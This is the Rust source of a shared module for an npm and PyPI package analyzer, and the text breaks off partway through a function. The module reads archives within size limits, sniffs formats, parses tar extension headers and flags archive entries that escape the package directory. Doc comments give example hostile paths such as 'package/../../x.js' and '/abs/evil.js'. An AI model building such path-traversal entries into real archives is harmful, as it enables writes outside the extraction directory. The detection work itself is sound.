//! Shared plumbing of the npm and PyPI package analyzers.
//!
//! * [`load`] reads a package from a gzip tarball, a plain tar, a zip or a
//!   directory into memory, bounded in entries and bytes, ignoring macOS
//!   AppleDouble (`._name`) and PAX metadata entries. Containers are detected
//!   by their first bytes ([`sniff`]), never by file extension.
//! * [`scan_source`] looks for the malicious patterns the tools claim to
//!   detect inside source files and returns findings with file and line.
//! * [`AdvisoryDataInfo`] states where the offline advisory data comes from so
//!   an empty vulnerability list is not read as a clean bill of health.
//!
//! Nothing here touches the network.

use std::collections::{BTreeSet, HashMap, HashSet};
use std::fs::File;
use std::io::Read;
use std::path::Path;
use std::sync::OnceLock;

use anyhow::{Context, Result};
use regex::Regex;
use serde::{Deserialize, Serialize};

/// Most entries listed from one package.
pub const MAX_LISTED_ENTRIES: usize = 50_000;
/// Most source files whose content is scanned.
pub const MAX_SCANNED_FILES: usize = 400;
/// Bytes of one file that are scanned; a longer file is scanned in its first bytes only.
pub const MAX_FILE_BYTES: usize = 1024 * 1024;
/// Bytes of source content scanned in one package.
pub const MAX_TOTAL_BYTES: usize = 16 * 1024 * 1024;
/// Largest manifest (`package.json`, `setup.py`, ...) that is read.
pub const MAX_MANIFEST_BYTES: usize = 2 * 1024 * 1024;
/// Largest dependency list (lock file, requirements file) that is read.
pub const MAX_DEPENDENCY_LIST_BYTES: u64 = 16 * 1024 * 1024;
/// Most entries of a dependency list that are analysed.
pub const MAX_DEPENDENCY_ENTRIES: usize = 20_000;

/// Read a lock or requirements file, refusing one above
/// [`MAX_DEPENDENCY_LIST_BYTES`] so a huge file cannot exhaust memory.
pub fn read_dependency_list(path: &Path) -> Result<String> {
    let name = path.file_name().and_then(|n| n.to_str()).unwrap_or("file");
    let size = std::fs::metadata(path)
        .with_context(|| format!("Cannot read {name}"))?
        .len();
    if size > MAX_DEPENDENCY_LIST_BYTES {
        anyhow::bail!(
            "{name} is {} MiB, over the {} MiB limit for dependency lists. Split it, or pass the package directory or tarball instead.",
            size / (1024 * 1024),
            MAX_DEPENDENCY_LIST_BYTES / (1024 * 1024)
        );
    }
    std::fs::read_to_string(path).with_context(|| format!("Failed to read {name} as UTF-8 text"))
}
/// Declared unpacked size at which listing an archive stops.
const MAX_DECLARED_BYTES: u64 = 1024 * 1024 * 1024;
/// Largest GNU long-name, long-link or PAX extension header that is read.
const MAX_TAR_EXTENSION_BYTES: u64 = 64 * 1024;
/// Most extension headers read from one archive.
const MAX_TAR_EXTENSIONS: usize = 100_000;
/// Most entries visited while listing one archive or directory, counting the
/// ones that are dropped (directories, metadata): a tar of empty entries
/// costs a header each.
const MAX_VISITED_ENTRIES: usize = 500_000;
/// Message for every tar read failure; the library's text can echo file bytes.
const TAR_DAMAGED: &str =
    "The tar archive is damaged or is not a tar archive, and could not be read to the end.";
/// Findings kept per (file, rule).
const MAX_PER_RULE_PER_FILE: usize = 3;
/// Findings kept per file.
const MAX_PER_FILE: usize = 40;
/// Statements of one attack chain (fetch, write, run) sit within this many lines.
const FLOW_WINDOW: usize = 60;
/// Longer lines (minified bundles) are not judged by the whole-file checks.
const FLOW_MAX_LINE: usize = 1000;
/// The environment and the send that carries it are this close.
const FLOW_ENV_WINDOW: usize = 8;

// ---------------------------------------------------------------------------
// Advisory data provenance
// ---------------------------------------------------------------------------

/// Where the vulnerability data behind a result comes from.
#[derive(Debug, Default, Serialize, Deserialize, Clone, PartialEq)]
pub struct AdvisoryDataInfo {
    /// What the data is.
    pub source: String,
    /// Date the table was last reviewed.
    pub last_updated: String,
    /// Publication date of the newest advisory in the table.
    pub newest_advisory: String,
    /// Packages the table has entries for.
    pub package_count: usize,
    /// Advisories in the table.
    pub advisory_count: usize,
    /// Always true: nothing is fetched.
    pub offline: bool,
    /// How to read an empty result.
    pub coverage_note: String,
}

/// What was read of the input and how much of it was scanned.
#[derive(Debug, Default, Serialize, Deserialize, Clone)]
pub struct InputInfo {
    /// `tarball`, `directory`, `zip`, `wheel`, `manifest`, `lockfile` or `requirements`.
    pub kind: String,
    /// Container format, for archives and directories.
    pub container: Option<String>,
    /// Manifest the package was identified from, path inside the package.
    pub manifest: Option<String>,
    /// Files in the package.
    pub files_total: usize,
    /// Source files whose content was scanned.
    pub files_scanned: usize,
    /// Bytes of source content scanned.
    pub bytes_scanned: usize,
    /// Source files scanned only in their first bytes.
    pub files_partial: usize,
    /// Source files not scanned because a limit was reached.
    pub files_skipped: usize,
    /// Source files were read and scanned (false for a dependency list).
    pub content_scanned: bool,
    /// Limits that applied and things that were skipped.
    pub notes: Vec<String>,
}

/// The score a package gets at least when part of it was not read.
pub const INCOMPLETE_FLOOR: f32 = 20.0;

/// The score a dependency list gets at least when one of its dependencies has a
/// known advisory: the list was not read as code and it names a vulnerable release.
pub const UNREAD_ADVISORY_FLOOR: f32 = 40.0;

/// The lowest score an input may get, with the reason, or `None` when the
/// computed score stands. An input that was not read in full (a dependency list,
/// a cut listing, skipped files) is never Safe, and a dependency list that names
/// a release with a known advisory is at least Medium.
pub fn input_floor(input: &InputInfo, has_advisory: bool) -> Option<(f32, String)> {
    if !input.content_scanned {
        let reason = if has_advisory {
            "only the dependency list was read and it names a release with a known advisory"
        } else {
            "only the dependency list was read; no source was scanned"
        };
        let floor = if has_advisory {
            UNREAD_ADVISORY_FLOOR
        } else {
            INCOMPLETE_FLOOR
        };
        return Some((floor, reason.to_string()));
    }
    input
        .incomplete_reason()
        .map(|reason| (INCOMPLETE_FLOOR, reason))
}

/// The risk level name for a score.
pub fn level_for_score(score: f32) -> &'static str {
    match score {
        x if x >= 80.0 => "Critical",
        x if x >= 60.0 => "High",
        x if x >= 40.0 => "Medium",
        x if x >= 20.0 => "Low",
        _ => "Safe",
    }
}

impl InputInfo {
    /// Why the package was not read in full (listing cut, files skipped or only
    /// partly scanned), or `None`. A verdict of Safe must not rest on this.
    pub fn incomplete_reason(&self) -> Option<String> {
        let listing_cut = self.notes.iter().any(|n| n.starts_with("listing stopped"));
        if !listing_cut && self.files_partial == 0 && self.files_skipped == 0 {
            return None;
        }
        let mut parts = Vec::new();
        if listing_cut {
            parts.push("the file listing was cut at a limit".to_string());
        }
        if self.files_partial > 0 {
            parts.push(format!(
                "{} source file(s) were scanned only in their first bytes",
                self.files_partial
            ));
        }
        if self.files_skipped > 0 {
            parts.push(format!(
                "{} source file(s) were not scanned",
                self.files_skipped
            ));
        }
        Some(format!("package not fully read: {}", parts.join("; ")))
    }

    /// Coverage of a loaded package.
    pub fn from_loaded(kind: &str, loaded: &LoadedPackage, manifest: Option<&str>) -> Self {
        Self {
            kind: kind.to_string(),
            container: Some(loaded.container.label().to_string()),
            manifest: manifest.map(str::to_string),
            files_total: loaded.files.len(),
            files_scanned: loaded.files_scanned,
            bytes_scanned: loaded.bytes_scanned,
            files_partial: loaded.files_partial,
            files_skipped: loaded.files_skipped,
            content_scanned: true,
            notes: loaded.notes.clone(),
        }
    }

    /// Coverage of a dependency list: no source was read.
    pub fn dependency_list(kind: &str, note: &str) -> Self {
        Self {
            kind: kind.to_string(),
            content_scanned: false,
            notes: vec![note.to_string()],
            ..Self::default()
        }
    }
}

// ---------------------------------------------------------------------------
// Containers
// ---------------------------------------------------------------------------

/// How a package is stored.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ContainerKind {
    /// gzip-compressed tar (.tgz, .tar.gz, sdist).
    TarGz,
    /// Uncompressed tar.
    Tar,
    /// zip (wheel, .zip).
    Zip,
    /// A directory on disk.
    Directory,
}

impl ContainerKind {
    /// Short name for results.
    pub const fn label(self) -> &'static str {
        match self {
            Self::TarGz => "tar.gz",
            Self::Tar => "tar",
            Self::Zip => "zip",
            Self::Directory => "directory",
        }
    }
}

/// Detect the container of a regular file from its first bytes.
///
/// `Ok(None)` means the content is none of gzip, zip or tar. Archives this
/// module cannot read (bzip2, xz, zstd, 7z, rar) are an error that names the
/// format.
pub fn sniff(path: &Path) -> Result<Option<ContainerKind>> {
    let mut file = File::open(path).with_context(|| format!("Cannot open {}", path.display()))?;
    let mut head = [0u8; 512];
    let mut filled = 0;
    while filled < head.len() {
        let n = file.read(&mut head[filled..])?;
        if n == 0 {
            break;
        }
        filled += n;
    }
    let head = &head[..filled];
    if head.starts_with(&[0x1f, 0x8b]) {
        return Ok(Some(ContainerKind::TarGz));
    }
    if head.starts_with(b"PK\x03\x04") || head.starts_with(b"PK\x05\x06") {
        return Ok(Some(ContainerKind::Zip));
    }
    if head.len() >= 262 && &head[257..262] == b"ustar" {
        return Ok(Some(ContainerKind::Tar));
    }
    let unsupported = if head.starts_with(b"BZh") {
        Some("bzip2")
    } else if head.starts_with(&[0xfd, b'7', b'z', b'X', b'Z', 0x00]) {
        Some("xz")
    } else if head.starts_with(&[0x28, 0xb5, 0x2f, 0xfd]) {
        Some("zstd")
    } else if head.starts_with(b"7z\xbc\xaf\x27\x1c") {
        Some("7z")
    } else if head.starts_with(b"Rar!") {
        Some("rar")
    } else {
        None
    };
    if let Some(format) = unsupported {
        anyhow::bail!(
            "{} is a {format} archive, which this tool cannot read. Recompress it as .tar.gz or \
             .zip, or unpack it and pass the directory.",
            path.display()
        );
    }
    Ok(None)
}

/// One file of a loaded package.
#[derive(Debug, Clone)]
pub struct LoadedFile {
    /// Path inside the package, `/`-separated, no leading `./`.
    pub path: String,
    /// Size in bytes as the container declares it.
    pub size: u64,
    /// Content, when the file is a manifest or a source file that was read.
    pub content: Option<Vec<u8>>,
    /// The content was cut at [`MAX_FILE_BYTES`].
    pub partial: bool,
    /// The entry's path as the archive spells it, only when that differs from
    /// `path` in a way that matters (an absolute path such as `/abs/evil.js`).
    pub archive_path: Option<String>,
}

/// An archive entry no `npm pack` or `sdist` writes and that a careless extractor
/// would follow out of the package directory (or link to a file outside it).
#[derive(Debug, Clone, PartialEq)]
pub struct UnsafeEntry {
    /// The path as the archive spells it (`/abs/evil.js`, `package/../../x.js`).
    pub path: String,
    /// `parent-traversal`, `absolute-path`, `symlink` or `hardlink`.
    pub kind: &'static str,
    /// Where a link points.
    pub target: Option<String>,
}

/// Most unsafe entries kept per package.
const MAX_UNSAFE_ENTRIES: usize = 50;

fn unsafe_path_kind(raw: &str) -> Option<&'static str> {
    let path = raw.replace('\\', "/");
    if path.starts_with('/') || path.as_bytes().get(1) == Some(&b':') {
        return Some("absolute-path");
    }
    path.split('/')
        .any(|part| part == "..")
        .then_some("parent-traversal")
}

/// Classify one archive entry; `None` when it is an ordinary one.
fn classify_unsafe(raw: &str, kind: tar::EntryType, link: Option<String>) -> Vec<UnsafeEntry> {
    let mut out = Vec::new();
    if let Some(path_kind) = unsafe_path_kind(raw) {
        out.push(UnsafeEntry {
            path: raw.to_string(),
            kind: path_kind,
            target: None,
        });
    }
    let link_kind = match kind {
        tar::EntryType::Symlink => Some("symlink"),
        tar::EntryType::Link => Some("hardlink"),
        _ => None,
    };
    if let Some(link_kind) = link_kind {
        out.push(UnsafeEntry {
            path: raw.to_string(),
            kind: link_kind,
            target: link,
        });
    }
    out
}

impl UnsafeEntry {
    fn describe(&self) -> String {
        match (self.kind, &self.target) {
            ("symlink", Some(target)) => format!("symlink {} -> {target}", self.path),
            ("hardlink", Some(target)) => format!("hard link {} -> {target}", self.path),
            ("symlink", None) => format!("symlink {}", self.path),
            ("hardlink", None) => format!("hard link {}", self.path),
            ("absolute-path", _) => format!("absolute path {}", self.path),
            _ => format!("path with .. {}", self.path),
        }
    }
}

/// Findings for the unsafe entries of a package archive: one per entry, High. A
/// real `npm pack` tarball or Python sdist never has such entries.
pub fn unsafe_entry_findings(loaded: &LoadedPackage) -> Vec<SourceFinding> {
    loaded
        .unsafe_entries
        .iter()
        .map(|entry| {
            let rule = match entry.kind {
                "parent-traversal" => "Archive entry escapes the package directory",
                "absolute-path" => "Archive entry with an absolute path",
                "symlink" => "Symlink in a package archive",
                _ => "Hard link in a package archive",
            };
            SourceFinding {
                rule: rule.to_string(),
                category: "unsafe-path".to_string(),
                severity: "High".to_string(),
                file: entry.path.clone(),
                line: 1,
                evidence: entry.describe().chars().take(160).collect(),
                in_comment: false,
            }
        })
        .collect()
}

/// One note for a package archive's unsafe entries, `None` when there are none.
pub fn unsafe_entry_note(loaded: &LoadedPackage) -> Option<String> {
    if loaded.unsafe_entries.is_empty() {
        return None;
    }
    let shown: Vec<String> = loaded
        .unsafe_entries
        .iter()
        .take(5)
        .map(UnsafeEntry::describe)
        .collect();
    let more = loaded.unsafe_entries.len().saturating_sub(5);
    let tail = if more > 0 {
        format!(" and {more} more")
    } else {
        String::new()
    };
    Some(format!(
        "UNSAFE ARCHIVE ENTRIES: {} entries leave the package directory or link outside it: {}{tail}. A tarball made by npm pack or an sdist never has such entries; extracting it could write outside the target directory.",
        loaded.unsafe_entries.len(),
        shown.join("; ")
    ))
}

/// A package read into memory.
#[derive(Debug, Clone)]
pub struct LoadedPackage {
    /// How it was stored.
    pub container: ContainerKind,
    /// Every regular file, in container order (metadata entries excluded).
    pub files: Vec<LoadedFile>,
    /// What was skipped or cut, in words.
    pub notes: Vec<String>,
    /// Listing stopped at [`MAX_LISTED_ENTRIES`] or the declared-size limit.
    pub listing_truncated: bool,
    /// Source files whose content was read.
    pub files_scanned: usize,
    /// Bytes of source content read.
    pub bytes_scanned: usize,
    /// Source files read only in part.
    pub files_partial: usize,
    /// Source files not read because a limit was reached.
    pub files_skipped: usize,
    /// Archive entries with `..` or absolute paths, and links (tar and zip only).
    pub unsafe_entries: Vec<UnsafeEntry>,
}

impl LoadedFile {
    /// The path to show: the archive's own spelling when it was an unsafe one.
    pub fn display_path(&self) -> &str {
        self.archive_path.as_deref().unwrap_or(&self.path)
    }
}

impl LoadedPackage {
    /// The last file with this exact path (a later archive entry replaces an earlier one).
    pub fn file(&self, path: &str) -> Option<&LoadedFile> {
        self.files.iter().rev().find(|f| f.path == path)
    }

    /// The text of a loaded file, decoded leniently.
    pub fn text(&self, path: &str) -> Option<String> {
        self.file(path)
            .and_then(|f| f.content.as_deref())
            .map(|bytes| String::from_utf8_lossy(bytes).into_owned())
    }
}

/// Which files of a package to read.
pub struct Selector {
    /// Manifests: always read (up to [`MAX_MANIFEST_BYTES`]).
    pub is_manifest: fn(&str) -> bool,
    /// Source files: read in order of depth, within the scan limits.
    pub is_source: fn(&str) -> bool,
}

/// True when the name is one macOS adds next to real files: an AppleDouble
/// `._name`, a `__MACOSX/` tree or `.DS_Store`. A name alone is not proof: see
/// [`is_appledouble`], which checks the content before the entry is dropped.
pub fn is_metadata_entry(path: &str) -> bool {
    let name = path.rsplit('/').next().unwrap_or(path);
    name.starts_with("._")
        || path.starts_with("__MACOSX/")
        || path.contains("/__MACOSX/")
        || name == ".DS_Store"
}

/// Magic number that starts every AppleDouble file.
const APPLEDOUBLE_MAGIC: [u8; 4] = [0x00, 0x05, 0x16, 0x07];

/// True when the first bytes of a file are an AppleDouble header (or the file
/// is `.DS_Store`, which holds no code). A file merely named `._payload.js`
/// whose content is something else is a real file and must be listed and read.
pub fn is_appledouble(path: &str, head: &[u8]) -> bool {
    path.rsplit('/').next() == Some(".DS_Store") || head.starts_with(&APPLEDOUBLE_MAGIC)
}

/// Read up to four bytes from the start of an entry.
fn read_head(reader: &mut dyn Read) -> Vec<u8> {
    let mut head = [0u8; 4];
    let mut filled = 0;
    while filled < head.len() {
        match reader.read(&mut head[filled..]) {
            Ok(0) | Err(_) => break,
            Ok(n) => filled += n,
        }
    }
    head[..filled].to_vec()
}

fn normalise_entry_path(raw: &str) -> String {
    let mut path = raw.replace('\\', "/");
    while let Some(rest) = path.strip_prefix("./") {
        path = rest.to_string();
    }
    path.trim_start_matches('/').to_string()
}

/// Directories a directory scan does not descend into.
pub(crate) const SKIPPED_DIRS: &[&str] = &[
    "node_modules",
    ".git",
    "__pycache__",
    ".venv",
    "venv",
    ".tox",
    ".mypy_cache",
    ".pytest_cache",
];

struct Listed {
    path: String,
    size: u64,
    ordinal: usize,
    /// The archive's own spelling of an unsafe path.
    raw: Option<String>,
}

/// Read a package.
pub fn load(path: &Path, container: ContainerKind, select: &Selector) -> Result<LoadedPackage> {
    let mut notes = Vec::new();
    let mut unsafe_entries: Vec<UnsafeEntry> = Vec::new();
    let (listed, listing_truncated, ignored) = match container {
        ContainerKind::Directory => list_dir(path, &mut notes)?,
        ContainerKind::TarGz | ContainerKind::Tar => {
            list_tar(path, container, &mut notes, &mut unsafe_entries)?
        }
        ContainerKind::Zip => list_zip(path, &mut unsafe_entries)?,
    };
    if ignored > 0 {
        notes.push(format!(
            "ignored {ignored} macOS AppleDouble / PAX metadata entries"
        ));
    }
    if listing_truncated {
        notes.push(format!(
            "listing stopped at a limit ({MAX_LISTED_ENTRIES} files listed, {MAX_VISITED_ENTRIES} entries visited, {} MiB declared or {} MiB of long-name and PAX headers); the rest of the package was not examined",
            MAX_DECLARED_BYTES / (1024 * 1024),
            MAX_TAR_EXTENSION_TOTAL / (1024 * 1024)
        ));
    }

    // Decide what to read. Later entries with the same path replace earlier ones.
    let mut last_for_path: HashMap<&str, usize> = HashMap::new();
    for (index, entry) in listed.iter().enumerate() {
        last_for_path.insert(entry.path.as_str(), index);
    }
    let mut want: HashSet<usize> = HashSet::new(); // ordinals
    let mut manifests = 0usize;
    let mut manifests_unread = 0usize;
    let mut manifest_sources = 0usize;
    let mut manifest_source_bytes = 0usize;
    let mut sources: Vec<usize> = Vec::new();
    for (index, entry) in listed.iter().enumerate() {
        if last_for_path.get(entry.path.as_str()) != Some(&index) {
            continue;
        }
        if (select.is_manifest)(&entry.path) {
            if entry.size <= MAX_MANIFEST_BYTES as u64 && manifests < 64 {
                manifests += 1;
                want.insert(entry.ordinal);
                // A manifest that is also source (setup.py) is read and scanned
                // like any source file: the counters must include it.
                if (select.is_source)(&entry.path) {
                    manifest_sources += 1;
                    manifest_source_bytes += entry.size as usize;
                }
            } else {
                manifests_unread += 1;
                notes.push(format!(
                    "manifest {} is larger than {MAX_MANIFEST_BYTES} bytes or beyond the 64 manifests read; it was not read",
                    entry.path
                ));
            }
        } else if (select.is_source)(&entry.path) {
            sources.push(index);
        }
    }
    sources.sort_by_key(|&i| (listed[i].path.matches('/').count(), listed[i].path.clone()));
    let mut files_scanned = manifest_sources;
    let mut bytes_scanned = manifest_source_bytes;
    let mut files_partial = 0usize;
    // An unread manifest (setup.py too big to parse) is a file that was not scanned.
    let mut files_skipped = manifests_unread;
    for &index in &sources {
        let entry = &listed[index];
        let take = (entry.size as usize).min(MAX_FILE_BYTES);
        if files_scanned >= MAX_SCANNED_FILES || bytes_scanned + take > MAX_TOTAL_BYTES {
            files_skipped += 1;
            continue;
        }
        if entry.size == 0 {
            continue;
        }
        files_scanned += 1;
        bytes_scanned += take;
        if entry.size as usize > MAX_FILE_BYTES {
            files_partial += 1;
        }
        want.insert(entry.ordinal);
    }
    if files_skipped > manifests_unread {
        notes.push(format!(
            "{} source files were not read: scan limit of {MAX_SCANNED_FILES} files / {} MiB reached (shallowest files are read first)",
            files_skipped - manifests_unread,
            MAX_TOTAL_BYTES / (1024 * 1024)
        ));
    }
    if files_partial > 0 {
        notes.push(format!(
            "{files_partial} source files are larger than {MAX_FILE_BYTES} bytes and were scanned only in their first {MAX_FILE_BYTES} bytes"
        ));
    }

    let mut contents = match container {
        ContainerKind::Directory => read_dir_files(path, &listed, &want)?,
        ContainerKind::TarGz | ContainerKind::Tar => read_tar_files(path, container, &want)?,
        ContainerKind::Zip => read_zip_files(path, &want)?,
    };

    let mut files: Vec<LoadedFile> = listed
        .into_iter()
        .map(|entry| {
            let content = contents.remove(&entry.ordinal);
            let limit = if (select.is_manifest)(&entry.path) {
                MAX_MANIFEST_BYTES
            } else {
                MAX_FILE_BYTES
            };
            LoadedFile {
                partial: entry.size as usize > limit && content.is_some(),
                path: entry.path,
                size: entry.size,
                content,
                archive_path: entry.raw,
            }
        })
        .collect();
    // Links carry no content, but a package that holds one should show it in its
    // file list (unless a regular file of the same name replaces it).
    let regular: HashSet<String> = files.iter().map(|f| f.path.clone()).collect();
    for entry in &unsafe_entries {
        if matches!(entry.kind, "symlink" | "hardlink") {
            let path = normalise_entry_path(&entry.path);
            if !regular.contains(&path) {
                files.push(LoadedFile {
                    path,
                    size: 0,
                    content: None,
                    partial: false,
                    archive_path: None,
                });
            }
        }
    }

    Ok(LoadedPackage {
        container,
        files,
        notes,
        listing_truncated,
        files_scanned,
        bytes_scanned,
        files_partial,
        files_skipped,
        unsafe_entries,
    })
}

type Listing = (Vec<Listed>, bool, usize);

fn list_dir(dir: &Path, notes: &mut Vec<String>) -> Result<Listing> {
    let mut listed = Vec::new();
    let mut truncated = false;
    let mut ignored = 0usize;
    let mut skipped_dirs: BTreeSet<String> = BTreeSet::new();
    let walker = walkdir::WalkDir::new(dir)
        .follow_links(false)
        .sort_by_file_name()
        .into_iter()
        .filter_entry(|entry| {
            entry.depth() == 0
                || !(entry.file_type().is_dir()
                    && SKIPPED_DIRS.contains(&entry.file_name().to_string_lossy().as_ref()))
        });
    let mut visited = 0usize;
    for entry in walker {
        let Ok(entry) = entry else { continue };
        visited += 1;
        if visited > MAX_VISITED_ENTRIES {
            truncated = true;
            break;
        }
        if !entry.file_type().is_file() {
            continue;
        }
        let relative = entry
            .path()
            .strip_prefix(dir)
            .unwrap_or(entry.path())
            .to_string_lossy()
            .into_owned();
        let relative = normalise_entry_path(&relative);
        if is_metadata_entry(&relative) {
            let head =
                File::open(entry.path()).map_or_else(|_| Vec::new(), |mut f| read_head(&mut f));
            if is_appledouble(&relative, &head) {
                ignored += 1;
                continue;
            }
        }
        if listed.len() >= MAX_LISTED_ENTRIES {
            truncated = true;
            break;
        }
        let size = entry.metadata().map_or(0, |m| m.len());
        let ordinal = listed.len();
        listed.push(Listed {
            path: relative,
            size,
            ordinal,
            raw: None,
        });
    }
    // Say which well-known directories were left out, when they exist.
    for name in SKIPPED_DIRS {
        if dir.join(name).is_dir() {
            skipped_dirs.insert((*name).to_string());
        }
    }
    if !skipped_dirs.is_empty() {
        notes.push(format!(
            "directories not scanned: {}. Pass a package directory inside node_modules or site-packages to analyze an installed dependency.",
            skipped_dirs.into_iter().collect::<Vec<_>>().join(", ")
        ));
    }
    Ok((listed, truncated, ignored))
}

fn read_dir_files(
    dir: &Path,
    listed: &[Listed],
    want: &HashSet<usize>,
) -> Result<HashMap<usize, Vec<u8>>> {
    let wanted: Vec<&Listed> = listed
        .iter()
        .filter(|entry| want.contains(&entry.ordinal))
        .collect();
    // Opening a file can wait on the file system or on a security agent that
    // inspects every open, with the CPU idle: read the files from a few threads.
    const READERS: usize = 8;
    let chunk = wanted.len().div_ceil(READERS).max(1);
    let mut out = HashMap::new();
    std::thread::scope(|scope| {
        let handles: Vec<_> = wanted
            .chunks(chunk)
            .map(|part| {
                scope.spawn(move || {
                    part.iter()
                        .filter_map(|entry| {
                            read_dir_file(&dir.join(&entry.path)).map(|buf| (entry.ordinal, buf))
                        })
                        .collect::<Vec<_>>()
                })
            })
            .collect();
        for handle in handles {
            if let Ok(rows) = handle.join() {
                out.extend(rows);
            }
        }
    });
    Ok(out)
}

/// The leading bytes of one regular file of a directory, or `None`.
fn read_dir_file(full: &Path) -> Option<Vec<u8>> {
    // The listing did not follow links; do not follow one that appeared since.
    let metadata = std::fs::symlink_metadata(full).ok()?;
    if !metadata.is_file() {
        return None;
    }
    let file = File::open(full).ok()?;
    let mut buf = Vec::new();
    file.take(MAX_MANIFEST_BYTES.max(MAX_FILE_BYTES) as u64)
        .read_to_end(&mut buf)
        .ok()?;
    Some(buf)
}

/// Most bytes of the (decompressed) stream one tar walk reads: the declared
/// data, the extension headers and an allowance for the 512-byte headers.
/// Zero blocks are not entries, so no entry budget counts them; this does.
const MAX_TAR_STREAM_BYTES: u64 = MAX_DECLARED_BYTES + MAX_TAR_EXTENSION_TOTAL + 64 * 1024 * 1024;

/// Reader that reports end of stream once `left` bytes are read, and says so.
struct BudgetReader {
    inner: Box<dyn Read + Send>,
    left: u64,
    exhausted: std::sync::Arc<std::sync::atomic::AtomicBool>,
}

impl Read for BudgetReader {
    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        if self.left == 0 {
            self.exhausted
                .store(true, std::sync::atomic::Ordering::Relaxed);
            return Ok(0);
        }
        let take = (buf.len() as u64).min(self.left) as usize;
        let n = self.inner.read(&mut buf[..take])?;
        self.left -= n as u64;
        Ok(n)
    }
}

/// Reads every gzip member of a file, and stops without error at bytes that do
/// not start another member, as gzip(1) does after a warning; `trailing` says so.
struct GzMembers {
    /// Between members: the input, positioned after the last member read.
    input: Option<std::io::BufReader<File>>,
    /// Inside a member.
    current: Option<flate2::bufread::GzDecoder<std::io::BufReader<File>>>,
    trailing: std::sync::Arc<std::sync::atomic::AtomicBool>,
}

impl Read for GzMembers {
    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        use std::io::BufRead as _;
        if buf.is_empty() {
            return Ok(0);
        }
        loop {
            if let Some(decoder) = self.current.as_mut() {
                let n = decoder.read(buf)?;
                if n > 0 {
                    return Ok(n);
                }
                // The member ended: take the input back for the next one.
                self.input = self
                    .current
                    .take()
                    .map(flate2::bufread::GzDecoder::into_inner);
            }
            let Some(mut input) = self.input.take() else {
                return Ok(0);
            };
            // Zero padding between members is skipped, as Python's gzip does. A
            // buffer can hold a single byte, so only the first byte decides.
            let first = loop {
                let head = input.fill_buf()?;
                let Some(&b) = head.first() else {
                    return Ok(0);
                };
                if b != 0 {
                    break b;
                }
                let zeros = head.iter().take_while(|&&z| z == 0).count();
                input.consume(zeros);
            };
            if first != 0x1f {
                self.trailing
                    .store(true, std::sync::atomic::Ordering::Relaxed);
                return Ok(0);
            }
            self.current = Some(flate2::bufread::GzDecoder::new(input));
        }
    }
}

type BudgetedTar = (
    tar::Archive<Box<dyn Read + Send>>,
    std::sync::Arc<std::sync::atomic::AtomicBool>,
    std::sync::Arc<std::sync::atomic::AtomicBool>,
);

fn tar_archive_budget(path: &Path, container: ContainerKind, budget: u64) -> Result<BudgetedTar> {
    let file = File::open(path).with_context(|| format!("Cannot open {}", path.display()))?;
    let trailing = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let reader: Box<dyn Read + Send> = if container == ContainerKind::TarGz {
        // npm and pip read every gzip member (`cat a.tgz b.tgz`), not only the first.
        Box::new(GzMembers {
            input: Some(std::io::BufReader::new(file)),
            current: None,
            trailing: trailing.clone(),
        })
    } else {
        Box::new(file)
    };
    let exhausted = std::sync::Arc::new(std::sync::atomic::AtomicBool::new(false));
    let reader: Box<dyn Read + Send> = Box::new(BudgetReader {
        inner: reader,
        left: budget,
        exhausted: exhausted.clone(),
    });
    let mut archive = tar::Archive::new(reader);
    // npm's tar needs two zero blocks to end an archive and Python and bsdtar read
    // on past one; read on to the end of the stream so no entry stays hidden.
    archive.set_ignore_zeros(true);
    Ok((archive, exhausted, trailing))
}

/// What a tar walk sees of one logical entry (extension headers are folded in).
struct TarItem<'a> {
    /// 0-based index among the logical entries.
    ordinal: usize,
    /// Resolved path: PAX `path`, GNU long name, or the header's own.
    path: String,
    kind: tar::EntryType,
    size: u64,
    /// Where a symbolic or hard link points.
    link: Option<String>,
    reader: &'a mut dyn Read,
}

/// Pull the `path` and `size` records out of a PAX extended header. `Err` when
/// the data is not made only of well-formed `len key=value\n` records, or a
/// `size` is not plain decimal digits: other tar readers parse such data
/// differently, so the archive is refused instead of guessed at.
fn pax_records(data: &[u8]) -> Result<(Option<Vec<u8>>, Option<u64>), ()> {
    let mut path = None;
    let mut size = None;
    let mut rest = data;
    while !rest.is_empty() {
        // Padding after the last record.
        if rest.iter().all(|&b| b == 0) {
            break;
        }
        let space = rest.iter().position(|&b| b == b' ').ok_or(())?;
        let len = std::str::from_utf8(&rest[..space])
            .ok()
            .filter(|n| !n.is_empty() && n.bytes().all(|b| b.is_ascii_digit()))
            .and_then(|n| n.parse::<usize>().ok())
            .ok_or(())?;
        if len <= space + 1 || len > rest.len() {
            return Err(());
        }
        let record = rest[space + 1..len].strip_suffix(b"\n").ok_or(())?;
        if !record.contains(&b'=') {
            return Err(());
        }
        if let Some(value) = record.strip_prefix(b"path=") {
            path = Some(value.to_vec());
        } else if let Some(value) = record.strip_prefix(b"size=") {
            if value.is_empty() || !value.iter().all(u8::is_ascii_digit) {
                return Err(());
            }
            size = Some(
                std::str::from_utf8(value)
                    .ok()
                    .and_then(|v| v.parse::<u64>().ok())
                    .ok_or(())?,
            );
        }
        rest = &rest[len..];
    }
    Ok((path, size))
}

/// Cut a name at its first NUL, as npm's tar, Python and bsdtar do.
fn cut_at_nul(mut name: Vec<u8>) -> Vec<u8> {
    if let Some(at) = name.iter().position(|&b| b == 0) {
        name.truncate(at);
    }
    name
}

/// Most bytes of long-name and PAX header data read from one tar. Ordinary
/// archives hold a few KiB; a bomb of 64 KiB headers is decompressed for
/// seconds, so past this the listing stops with a note.
const MAX_TAR_EXTENSION_TOTAL: u64 = 64 * 1024 * 1024;

/// Visit the logical entries of a tar. GNU long-name and PAX headers are read
/// here, with a hard cap, instead of by the tar library (which reads a whole
/// extension entry into memory whatever size the header declares). Returns the
/// number of PAX header entries seen and whether the walk stopped at the budget
/// for extension headers. `visit` returns `false` to stop.
fn walk_tar(
    path: &Path,
    container: ContainerKind,
    visit: &mut dyn FnMut(TarItem<'_>) -> Result<bool>,
) -> Result<(usize, bool)> {
    walk_tar_budget(path, container, MAX_TAR_STREAM_BYTES, visit)
}

fn walk_tar_budget(
    path: &Path,
    container: ContainerKind,
    budget: u64,
    visit: &mut dyn FnMut(TarItem<'_>) -> Result<bool>,
) -> Result<(usize, bool)> {
